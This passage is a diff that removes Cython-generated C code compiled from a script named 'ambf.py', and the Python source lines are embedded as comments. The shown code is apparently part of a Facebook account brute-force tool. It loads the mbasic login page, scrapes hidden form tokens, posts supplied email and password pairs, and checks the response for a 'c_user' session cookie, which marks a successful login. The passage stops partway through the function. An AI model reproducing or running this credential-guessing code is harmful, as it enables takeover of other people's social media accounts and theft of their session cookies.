-        __pyx_t_8 = PyNumber_Add(__pyx_v_host, __pyx_kp_s_login_next_ref_dbl_fl_refid_8); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 486, __pyx_L11_error)
-        __Pyx_GOTREF(__pyx_t_8);
-        if (PyDict_SetItem(__pyx_t_12, __pyx_n_s_referer, __pyx_t_8) < 0) __PYX_ERR(0, 486, __pyx_L11_error)
-        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
-        if (PyDict_SetItem(__pyx_t_12, __pyx_kp_s_cache_control, __pyx_kp_s_max_age_0) < 0) __PYX_ERR(0, 486, __pyx_L11_error)
-        if (PyDict_SetItem(__pyx_t_12, __pyx_kp_s_upgrade_insecure_requests, __pyx_kp_s_1) < 0) __PYX_ERR(0, 486, __pyx_L11_error)
-        if (PyDict_SetItem(__pyx_t_12, __pyx_kp_s_content_type, __pyx_kp_s_application_x_www_form_urlencode) < 0) __PYX_ERR(0, 486, __pyx_L11_error)
-        __pyx_t_8 = NULL;
-        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_11))) {
-          __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_11);
-          if (likely(__pyx_t_8)) {
-            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_11);
-            __Pyx_INCREF(__pyx_t_8);
-            __Pyx_INCREF(function);
-            __Pyx_DECREF_SET(__pyx_t_11, function);
-          }
-        }
-        __pyx_t_6 = (__pyx_t_8) ? __Pyx_PyObject_Call2Args(__pyx_t_11, __pyx_t_8, __pyx_t_12) : __Pyx_PyObject_CallOneArg(__pyx_t_11, __pyx_t_12);
-        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
-        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
-        if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 486, __pyx_L11_error)
-        __Pyx_GOTREF(__pyx_t_6);
-        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
-        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
-
-        /* "ambf.py":487
- * 			ses = requests.Session()
- * 			ses.headers.update({"origin": host, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8", "user-agent": ua, "Host": "".join(bs4.re.findall("://(.*?)$",host)), "referer": host+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
- * 			p = ses.get(host+"/login/?next&ref=dbl&refid=8").text             # <<<<<<<<<<<<<<
- * 			b = parser(p,"html.parser")
- * 			bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
- */
-        __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_v_ses, __pyx_n_s_get); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 487, __pyx_L11_error)
-        __Pyx_GOTREF(__pyx_t_11);
-        __pyx_t_12 = PyNumber_Add(__pyx_v_host, __pyx_kp_s_login_next_ref_dbl_refid_8); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 487, __pyx_L11_error)
-        __Pyx_GOTREF(__pyx_t_12);
-        __pyx_t_8 = NULL;
-        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_11))) {
-          __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_11);
-          if (likely(__pyx_t_8)) {
-            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_11);
-            __Pyx_INCREF(__pyx_t_8);
-            __Pyx_INCREF(function);
-            __Pyx_DECREF_SET(__pyx_t_11, function);
-          }
-        }
-        __pyx_t_6 = (__pyx_t_8) ? __Pyx_PyObject_Call2Args(__pyx_t_11, __pyx_t_8, __pyx_t_12) : __Pyx_PyObject_CallOneArg(__pyx_t_11, __pyx_t_12);
-        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
-        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
-        if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 487, __pyx_L11_error)
-        __Pyx_GOTREF(__pyx_t_6);
-        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
-        __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_text); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 487, __pyx_L11_error)
-        __Pyx_GOTREF(__pyx_t_11);
-        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
-        __Pyx_XDECREF_SET(__pyx_v_p, __pyx_t_11);
-        __pyx_t_11 = 0;
-
-        /* "ambf.py":488
- * 			ses.headers.update({"origin": host, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8", "user-agent": ua, "Host": "".join(bs4.re.findall("://(.*?)$",host)), "referer": host+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
- * 			p = ses.get(host+"/login/?next&ref=dbl&refid=8").text
- * 			b = parser(p,"html.parser")             # <<<<<<<<<<<<<<
- * 			bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
- * 			for i in b("input"):
- */
-        __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_parser); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 488, __pyx_L11_error)
-        __Pyx_GOTREF(__pyx_t_6);
-        __pyx_t_12 = NULL;
-        __pyx_t_7 = 0;
-        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
-          __pyx_t_12 = PyMethod_GET_SELF(__pyx_t_6);
-          if (likely(__pyx_t_12)) {
-            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
-            __Pyx_INCREF(__pyx_t_12);
-            __Pyx_INCREF(function);
-            __Pyx_DECREF_SET(__pyx_t_6, function);
-            __pyx_t_7 = 1;
-          }
-        }
-        #if CYTHON_FAST_PYCALL
-        if (PyFunction_Check(__pyx_t_6)) {
-          PyObject *__pyx_temp[3] = {__pyx_t_12, __pyx_v_p, __pyx_kp_s_html_parser};
-          __pyx_t_11 = __Pyx_PyFunction_FastCall(__pyx_t_6, __pyx_temp+1-__pyx_t_7, 2+__pyx_t_7); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 488, __pyx_L11_error)
-          __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
-          __Pyx_GOTREF(__pyx_t_11);
-        } else
-        #endif
-        #if CYTHON_FAST_PYCCALL
-        if (__Pyx_PyFastCFunction_Check(__pyx_t_6)) {
-          PyObject *__pyx_temp[3] = {__pyx_t_12, __pyx_v_p, __pyx_kp_s_html_parser};
-          __pyx_t_11 = __Pyx_PyCFunction_FastCall(__pyx_t_6, __pyx_temp+1-__pyx_t_7, 2+__pyx_t_7); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 488, __pyx_L11_error)
-          __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
-          __Pyx_GOTREF(__pyx_t_11);
-        } else
-        #endif
-        {
-          __pyx_t_8 = PyTuple_New(2+__pyx_t_7); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 488, __pyx_L11_error)
-          __Pyx_GOTREF(__pyx_t_8);
-          if (__pyx_t_12) {
-            __Pyx_GIVEREF(__pyx_t_12); PyTuple_SET_ITEM(__pyx_t_8, 0, __pyx_t_12); __pyx_t_12 = NULL;
-          }
-          __Pyx_INCREF(__pyx_v_p);
-          __Pyx_GIVEREF(__pyx_v_p);
-          PyTuple_SET_ITEM(__pyx_t_8, 0+__pyx_t_7, __pyx_v_p);
-          __Pyx_INCREF(__pyx_kp_s_html_parser);
-          __Pyx_GIVEREF(__pyx_kp_s_html_parser);
-          PyTuple_SET_ITEM(__pyx_t_8, 1+__pyx_t_7, __pyx_kp_s_html_parser);
-          __pyx_t_11 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_t_8, NULL); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 488, __pyx_L11_error)
-          __Pyx_GOTREF(__pyx_t_11);
-          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
-        }
-        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
-        __Pyx_XDECREF_SET(__pyx_v_b, __pyx_t_11);
-        __pyx_t_11 = 0;
-
-        /* "ambf.py":489
- * 			p = ses.get(host+"/login/?next&ref=dbl&refid=8").text
- * 			b = parser(p,"html.parser")
- * 			bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]             # <<<<<<<<<<<<<<
- * 			for i in b("input"):
- * 				try:
- */
-        __pyx_t_11 = PyList_New(7); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 489, __pyx_L11_error)
-        __Pyx_GOTREF(__pyx_t_11);
-        __Pyx_INCREF(__pyx_n_s_lsd);
-        __Pyx_GIVEREF(__pyx_n_s_lsd);
-        PyList_SET_ITEM(__pyx_t_11, 0, __pyx_n_s_lsd);
-        __Pyx_INCREF(__pyx_n_s_jazoest);
-        __Pyx_GIVEREF(__pyx_n_s_jazoest);
-        PyList_SET_ITEM(__pyx_t_11, 1, __pyx_n_s_jazoest);
-        __Pyx_INCREF(__pyx_n_s_m_ts);
-        __Pyx_GIVEREF(__pyx_n_s_m_ts);
-        PyList_SET_ITEM(__pyx_t_11, 2, __pyx_n_s_m_ts);
-        __Pyx_INCREF(__pyx_n_s_li);
-        __Pyx_GIVEREF(__pyx_n_s_li);
-        PyList_SET_ITEM(__pyx_t_11, 3, __pyx_n_s_li);
-        __Pyx_INCREF(__pyx_n_s_try_number);
-        __Pyx_GIVEREF(__pyx_n_s_try_number);
-        PyList_SET_ITEM(__pyx_t_11, 4, __pyx_n_s_try_number);
-        __Pyx_INCREF(__pyx_n_s_unrecognized_tries);
-        __Pyx_GIVEREF(__pyx_n_s_unrecognized_tries);
-        PyList_SET_ITEM(__pyx_t_11, 5, __pyx_n_s_unrecognized_tries);
-        __Pyx_INCREF(__pyx_n_s_login);
-        __Pyx_GIVEREF(__pyx_n_s_login);
-        PyList_SET_ITEM(__pyx_t_11, 6, __pyx_n_s_login);
-        __Pyx_XDECREF_SET(__pyx_v_bl, ((PyObject*)__pyx_t_11));
-        __pyx_t_11 = 0;
-
-        /* "ambf.py":490
- * 			b = parser(p,"html.parser")
- * 			bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
- * 			for i in b("input"):             # <<<<<<<<<<<<<<
- * 				try:
- * 					if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
- */
-        __Pyx_INCREF(__pyx_v_b);
-        __pyx_t_6 = __pyx_v_b; __pyx_t_8 = NULL;
-        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
-          __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_6);
-          if (likely(__pyx_t_8)) {
-            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
-            __Pyx_INCREF(__pyx_t_8);
-            __Pyx_INCREF(function);
-            __Pyx_DECREF_SET(__pyx_t_6, function);
-          }
-        }
-        __pyx_t_11 = (__pyx_t_8) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_8, __pyx_n_s_input) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_n_s_input);
-        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
-        if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 490, __pyx_L11_error)
-        __Pyx_GOTREF(__pyx_t_11);
-        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
-        if (likely(PyList_CheckExact(__pyx_t_11)) || PyTuple_CheckExact(__pyx_t_11)) {
-          __pyx_t_6 = __pyx_t_11; __Pyx_INCREF(__pyx_t_6); __pyx_t_15 = 0;
-          __pyx_t_16 = NULL;
-        } else {
-          __pyx_t_15 = -1; __pyx_t_6 = PyObject_GetIter(__pyx_t_11); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 490, __pyx_L11_error)
-          __Pyx_GOTREF(__pyx_t_6);
-          __pyx_t_16 = Py_TYPE(__pyx_t_6)->tp_iternext; if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 490, __pyx_L11_error)
-        }
-        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
-        for (;;) {
-          if (likely(!__pyx_t_16)) {
-            if (likely(PyList_CheckExact(__pyx_t_6))) {
-              if (__pyx_t_15 >= PyList_GET_SIZE(__pyx_t_6)) break;
-              #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
-              __pyx_t_11 = PyList_GET_ITEM(__pyx_t_6, __pyx_t_15); __Pyx_INCREF(__pyx_t_11); __pyx_t_15++; if (unlikely(0 < 0)) __PYX_ERR(0, 490, __pyx_L11_error)
-              #else
-              __pyx_t_11 = PySequence_ITEM(__pyx_t_6, __pyx_t_15); __pyx_t_15++; if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 490, __pyx_L11_error)
-              __Pyx_GOTREF(__pyx_t_11);
-              #endif
-            } else {
-              if (__pyx_t_15 >= PyTuple_GET_SIZE(__pyx_t_6)) break;
-              #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
-              __pyx_t_11 = PyTuple_GET_ITEM(__pyx_t_6, __pyx_t_15); __Pyx_INCREF(__pyx_t_11); __pyx_t_15++; if (unlikely(0 < 0)) __PYX_ERR(0, 490, __pyx_L11_error)
-              #else
-              __pyx_t_11 = PySequence_ITEM(__pyx_t_6, __pyx_t_15); __pyx_t_15++; if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 490, __pyx_L11_error)
-              __Pyx_GOTREF(__pyx_t_11);
-              #endif
-            }
-          } else {
-            __pyx_t_11 = __pyx_t_16(__pyx_t_6);
-            if (unlikely(!__pyx_t_11)) {
-              PyObject* exc_type = PyErr_Occurred();
-              if (exc_type) {
-                if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
-                else __PYX_ERR(0, 490, __pyx_L11_error)
-              }
-              break;
-            }
-            __Pyx_GOTREF(__pyx_t_11);
-          }
-          __Pyx_XDECREF_SET(__pyx_v_i, __pyx_t_11);
-          __pyx_t_11 = 0;
-
-          /* "ambf.py":491
- * 			bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
- * 			for i in b("input"):
- * 				try:             # <<<<<<<<<<<<<<
- * 					if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
- * 					else:continue
- */
-          {
-            __Pyx_PyThreadState_declare
-            __Pyx_PyThreadState_assign
-            __Pyx_ExceptionSave(&__pyx_t_17, &__pyx_t_18, &__pyx_t_19);
-            __Pyx_XGOTREF(__pyx_t_17);
-            __Pyx_XGOTREF(__pyx_t_18);
-            __Pyx_XGOTREF(__pyx_t_19);
-            /*try:*/ {
-
-              /* "ambf.py":492
- * 			for i in b("input"):
- * 				try:
- * 					if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})             # <<<<<<<<<<<<<<
- * 					else:continue
- * 				except:pass
- */
-              __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_v_i, __pyx_n_s_get); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 492, __pyx_L21_error)
-              __Pyx_GOTREF(__pyx_t_8);
-              __pyx_t_12 = NULL;
-              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_8))) {
-                __pyx_t_12 = PyMethod_GET_SELF(__pyx_t_8);
-                if (likely(__pyx_t_12)) {
-                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
-                  __Pyx_INCREF(__pyx_t_12);
-                  __Pyx_INCREF(function);
-                  __Pyx_DECREF_SET(__pyx_t_8, function);
-                }
-              }
-              __pyx_t_11 = (__pyx_t_12) ? __Pyx_PyObject_Call2Args(__pyx_t_8, __pyx_t_12, __pyx_n_s_name) : __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_n_s_name);
-              __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
-              if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 492, __pyx_L21_error)
-              __Pyx_GOTREF(__pyx_t_11);
-              __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
-              __pyx_t_20 = (__Pyx_PySequence_ContainsTF(__pyx_t_11, __pyx_v_bl, Py_EQ)); if (unlikely(__pyx_t_20 < 0)) __PYX_ERR(0, 492, __pyx_L21_error)
-              __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
-              __pyx_t_21 = (__pyx_t_20 != 0);
-              if (__pyx_t_21) {
-                __pyx_t_11 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 492, __pyx_L21_error)
-                __Pyx_GOTREF(__pyx_t_11);
-                __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_v_i, __pyx_n_s_get); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 492, __pyx_L21_error)
-                __Pyx_GOTREF(__pyx_t_12);
-                __pyx_t_10 = NULL;
-                if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_12))) {
-                  __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_12);
-                  if (likely(__pyx_t_10)) {
-                    PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_12);
-                    __Pyx_INCREF(__pyx_t_10);
-                    __Pyx_INCREF(function);
-                    __Pyx_DECREF_SET(__pyx_t_12, function);
-                  }
-                }
-                __pyx_t_8 = (__pyx_t_10) ? __Pyx_PyObject_Call2Args(__pyx_t_12, __pyx_t_10, __pyx_n_s_name) : __Pyx_PyObject_CallOneArg(__pyx_t_12, __pyx_n_s_name);
-                __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
-                if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 492, __pyx_L21_error)
-                __Pyx_GOTREF(__pyx_t_8);
-                __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
-                __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_v_i, __pyx_n_s_get); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 492, __pyx_L21_error)
-                __Pyx_GOTREF(__pyx_t_10);
-                __pyx_t_14 = NULL;
-                if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_10))) {
-                  __pyx_t_14 = PyMethod_GET_SELF(__pyx_t_10);
-                  if (likely(__pyx_t_14)) {
-                    PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
-                    __Pyx_INCREF(__pyx_t_14);
-                    __Pyx_INCREF(function);
-                    __Pyx_DECREF_SET(__pyx_t_10, function);
-                  }
-                }
-                __pyx_t_12 = (__pyx_t_14) ? __Pyx_PyObject_Call2Args(__pyx_t_10, __pyx_t_14, __pyx_n_s_value) : __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_n_s_value);
-                __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
-                if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 492, __pyx_L21_error)
-                __Pyx_GOTREF(__pyx_t_12);
-                __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
-                if (PyDict_SetItem(__pyx_t_11, __pyx_t_8, __pyx_t_12) < 0) __PYX_ERR(0, 492, __pyx_L21_error)
-                __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
-                __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
-                __pyx_t_12 = __Pyx_CallUnboundCMethod1(&__pyx_umethod_PyDict_Type_update, __pyx_v_kwargs, __pyx_t_11); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 492, __pyx_L21_error)
-                __Pyx_GOTREF(__pyx_t_12);
-                __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
-                __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
-                goto __pyx_L29;
-              }
-
-              /* "ambf.py":493
- * 				try:
- * 					if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
- * 					else:continue             # <<<<<<<<<<<<<<
- * 				except:pass
- * 			kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
- */
-              /*else*/ {
-                goto __pyx_L27_try_continue;
-              }
-              __pyx_L29:;
-
-              /* "ambf.py":491
- * 			bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
- * 			for i in b("input"):
- * 				try:             # <<<<<<<<<<<<<<
- * 					if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
- * 					else:continue
- */
-            }
-            __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
-            __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
-            __Pyx_XDECREF(__pyx_t_19); __pyx_t_19 = 0;
-            goto __pyx_L28_try_end;
-            __pyx_L21_error:;
-            __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
-            __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
-            __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
-            __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
-            __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
-            __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
-
-            /* "ambf.py":494
- * 					if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
- * 					else:continue
- * 				except:pass             # <<<<<<<<<<<<<<
- * 			kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
- * 			gaaa = ses.post(host+"/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
- */
-            /*except:*/ {
-              __Pyx_ErrRestore(0,0,0);
-              goto __pyx_L22_exception_handled;
-            }
-            __pyx_L27_try_continue:;
-
-            /* "ambf.py":491
- * 			bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
- * 			for i in b("input"):
- * 				try:             # <<<<<<<<<<<<<<
- * 					if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
- * 					else:continue
- */
-            __Pyx_XGIVEREF(__pyx_t_17);
-            __Pyx_XGIVEREF(__pyx_t_18);
-            __Pyx_XGIVEREF(__pyx_t_19);
-            __Pyx_ExceptionReset(__pyx_t_17, __pyx_t_18, __pyx_t_19);
-            goto __pyx_L19_continue;
-            __pyx_L22_exception_handled:;
-            __Pyx_XGIVEREF(__pyx_t_17);
-            __Pyx_XGIVEREF(__pyx_t_18);
-            __Pyx_XGIVEREF(__pyx_t_19);
-            __Pyx_ExceptionReset(__pyx_t_17, __pyx_t_18, __pyx_t_19);
-            __pyx_L28_try_end:;
-          }
-
-          /* "ambf.py":490
- * 			b = parser(p,"html.parser")
- * 			bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
- * 			for i in b("input"):             # <<<<<<<<<<<<<<
- * 				try:
- * 					if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
- */
-          __pyx_L19_continue:;
-        }
-        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
-
-        /* "ambf.py":495
- * 					else:continue
- * 				except:pass
- * 			kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})             # <<<<<<<<<<<<<<
- * 			gaaa = ses.post(host+"/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
- * 			if "c_user" in ses.cookies.get_dict().keys():
- */
-        __pyx_t_6 = __Pyx_PyDict_NewPresized(11); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 495, __pyx_L11_error)
-        __Pyx_GOTREF(__pyx_t_6);
-        if (PyDict_SetItem(__pyx_t_6, __pyx_n_s_email, __pyx_v_uid) < 0) __PYX_ERR(0, 495, __pyx_L11_error)
-        if (PyDict_SetItem(__pyx_t_6, __pyx_n_s_pass, __pyx_v_pw) < 0) __PYX_ERR(0, 495, __pyx_L11_error)
-        if (PyDict_SetItem(__pyx_t_6, __pyx_n_s_prefill_contact_point, __pyx_kp_s__7) < 0) __PYX_ERR(0, 495, __pyx_L11_error)
-        if (PyDict_SetItem(__pyx_t_6, __pyx_n_s_prefill_source, __pyx_kp_s__7) < 0) __PYX_ERR(0, 495, __pyx_L11_error)
-        if (PyDict_SetItem(__pyx_t_6, __pyx_n_s_prefill_type, __pyx_kp_s__7) < 0) __PYX_ERR(0, 495, __pyx_L11_error)
-        if (PyDict_SetItem(__pyx_t_6, __pyx_n_s_first_prefill_source, __pyx_kp_s__7) < 0) __PYX_ERR(0, 495, __pyx_L11_error)
-        if (PyDict_SetItem(__pyx_t_6, __pyx_n_s_first_prefill_type, __pyx_kp_s__7) < 0) __PYX_ERR(0, 495, __pyx_L11_error)
-        if (PyDict_SetItem(__pyx_t_6, __pyx_n_s_had_cp_prefilled, __pyx_n_s_false) < 0) __PYX_ERR(0, 495, __pyx_L11_error)
-        if (PyDict_SetItem(__pyx_t_6, __pyx_n_s_had_password_prefilled, __pyx_n_s_false) < 0) __PYX_ERR(0, 495, __pyx_L11_error)
-        if (PyDict_SetItem(__pyx_t_6, __pyx_n_s_is_smart_lock, __pyx_n_s_false) < 0) __PYX_ERR(0, 495, __pyx_L11_error)
-        if (PyDict_SetItem(__pyx_t_6, __pyx_n_s_fb_noscript, __pyx_n_s_true) < 0) __PYX_ERR(0, 495, __pyx_L11_error)
-        __pyx_t_12 = __Pyx_CallUnboundCMethod1(&__pyx_umethod_PyDict_Type_update, __pyx_v_kwargs, __pyx_t_6); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 495, __pyx_L11_error)
-        __Pyx_GOTREF(__pyx_t_12);
-        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
-        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
-
-        /* "ambf.py":496
- * 				except:pass
- * 			kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
- * 			gaaa = ses.post(host+"/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)             # <<<<<<<<<<<<<<
- * 			if "c_user" in ses.cookies.get_dict().keys():
- * 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
- */
-        __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_v_ses, __pyx_n_s_post); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 496, __pyx_L11_error)
-        __Pyx_GOTREF(__pyx_t_12);
-        __pyx_t_6 = PyNumber_Add(__pyx_v_host, __pyx_kp_s_login_device_based_regular_logi); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 496, __pyx_L11_error)
-        __Pyx_GOTREF(__pyx_t_6);
-        __pyx_t_11 = PyTuple_New(1); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 496, __pyx_L11_error)
-        __Pyx_GOTREF(__pyx_t_11);
-        __Pyx_GIVEREF(__pyx_t_6);
-        PyTuple_SET_ITEM(__pyx_t_11, 0, __pyx_t_6);
-        __pyx_t_6 = 0;
-        __pyx_t_6 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 496, __pyx_L11_error)
-        __Pyx_GOTREF(__pyx_t_6);
-        if (PyDict_SetItem(__pyx_t_6, __pyx_n_s_data, __pyx_v_kwargs) < 0) __PYX_ERR(0, 496, __pyx_L11_error)
-        __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_12, __pyx_t_11, __pyx_t_6); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 496, __pyx_L11_error)
-        __Pyx_GOTREF(__pyx_t_8);
-        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
-        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
-        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
-        __Pyx_XDECREF_SET(__pyx_v_gaaa, __pyx_t_8);
-        __pyx_t_8 = 0;
-
-        /* "ambf.py":497
- * 			kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
- * 			gaaa = ses.post(host+"/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
- * 			if "c_user" in ses.cookies.get_dict().keys():             # <<<<<<<<<<<<<<
